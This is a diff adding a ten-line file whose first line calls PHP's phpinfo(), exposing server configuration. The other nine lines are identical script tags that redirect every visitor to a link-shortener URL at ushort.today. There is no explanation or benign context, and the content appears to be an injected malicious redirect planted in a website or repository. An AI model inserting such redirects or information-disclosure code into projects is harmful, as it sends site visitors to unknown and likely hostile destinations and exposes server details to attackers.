@@ -1,0 +1,10 @@
+<?php phpinfo(); ?>
+<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
+<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
+<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
+<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
+<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
+<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
+<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
+<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
+<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
